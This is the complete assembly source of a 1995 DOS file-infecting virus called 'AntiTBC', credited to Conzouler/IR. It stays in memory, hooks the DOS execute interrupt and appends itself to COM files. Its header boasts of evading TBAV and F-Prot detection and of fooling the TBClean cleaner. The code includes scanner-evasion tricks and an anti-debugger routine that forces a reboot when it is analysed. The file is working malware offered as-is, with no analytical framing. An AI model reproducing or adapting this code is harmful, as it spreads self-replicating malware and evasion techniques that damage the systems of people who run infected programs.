;  AntiTBC - written by Conzouler/IR 1995
;
;  Based on RSV.
;
;  Features:
;  memory resident
;  com-append on execute
;  no tb-flags (of course)
;  no f-prot heuristics
;  fools tbclean (look at the restore routine)
;

.model tiny
.code
 org 100h

psize   equ     (offset last - offset entry) / 10h + 2
size    equ     offset last - offset entry

entry:
        db      0e9h,0,0                        ; Initial jump
start:
        call    gores

oentry  db      0CDh,20h,90h

gores:
        mov     ax, 4277h                       ; Installation check
        int     21h
        jnc     restore

        mov     ah, 4Ah                         ; Get size of memory block
        mov     bx, 0FFFFh
        int     21h
        mov     ah, 4Ah                         ; Change size of memory
        sub     bx, psize+1                     ; Make space for virus
        int     21h
        mov     ah, 48h                         ; Allocate memory
        mov     bx, psize
        int     21h
        sub     ax, 10h                         ; Compensate org 100h
        mov     es, ax
        mov     di, 103h
        mov     si, sp                          ; Get entry point
        mov     si, [si]
        sub     si, 3                           ; Subtract first call
        mov     cx, size-3
        rep     movsb                           ; Copy virus to new memory
        push    es
        pop     ds
        inc     byte ptr ds:[0F1h]              ; Mark owner of memory
        mov     ax, 3521h                       ; Get interrupt vector
        int     21h
        mov     i21o, bx
        mov     i21s, es
        mov     ah, 25h                         ; Set interrupt vector
        mov     dx, offset vec21
        int     21h

restore:
        mov     di, 100h
        push    cs                              ; Set es and ds to psp
        pop     ds
        push    ds
        pop     es
        pop     si                              ; Get entry point
        push    di                              ; Save it


; This piece of code will fool a debugger

        ; Check if debugger
        jmp     clear                           ; Clear prefetch queue
clear:  mov     byte ptr [$+6], 0               ; Disable next jump
        jmp     nodebug                         ; This jump will be
                                                ; disabled if debugger.
        ; Hohoho.. A debugger or TB-Clean...
        ; Move destructive code to beginning instead
        mov     cx, efflen
        add     si, offset effect - offset oentry
        rep     movsb
        retn

nodebug:
        movsw                                   ; Restore program entry point
        movsb
        retn                                    ; Jump to 100h


effect:
        ; This is the effect that will run if a debugger is used.
        ; Reboot
        db      0EAh, 000h, 0F0h, 0FFh, 0FFh    ; Jump FFFF:F000
efflen  equ     $ - offset effect



vec21:
        cmp     ax, 4277h                       ; Installation check
        jne     v21e
        iret
v21e:   cmp     ax, 4B00h                       ; Execute program
        jne     v21x

        push    ax                              ; Infect file
        push    bx
        push    cx
        push    dx
        push    ds

        mov     ax, 3D82h                       ; Open file
        int     21h
        xchg    ax, bx                          ; Put handle in bx

        push    cs                              ; Read first bytes
        pop     ds                              ; to oentry
        mov     ah, 3Fh
        mov     dx, offset oentry
        mov     cx, 3
        int     21h
        cmp     byte ptr oentry, 'M'            ; Check if exe file
        je      infectx
        push    cx

        mov     ax, 4202h                       ; Seek to eof
        xor     cx, cx
        cwd                                     ; Zero dx
        int     21h

        sub     ax, 3                           ; Get offset to eof
        mov     word ptr entry[1], ax           ; Save as jump
        xchg    dx, ax
        mov     ax, 4200h
        int     21h
        mov     ah, 3Fh                         ; Infection check
        mov     dx, offset last
        pop     cx

        int     21h
        cmp     byte ptr last[2], 0EAh          ; Check if infected
        je      infectx

        mov     byte ptr entry, 0E9h            ; Create jump opcode

        mov     ah, 3Fh                         ; Append virus
        inc     ah                              ; Fool TBScan
        push    ax
        mov     dx, 103h
        mov     cx, size-7
        int     21h

        mov     ax, 4200h                       ; Insert jump
        xor     cx, cx
        cwd
        int     21h

        pop     ax
        mov     dh, 1h                          ; 100h in dx
        mov     cl, 3                           ; 3 in cx
        int     21h
infectx:
        mov     ah, 3Eh
        int     21h

        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax

v21x:   db      0EAh                            ; Jump to dos vector
i21o    dw      ?
i21s    dw      ?
last:
end     entry

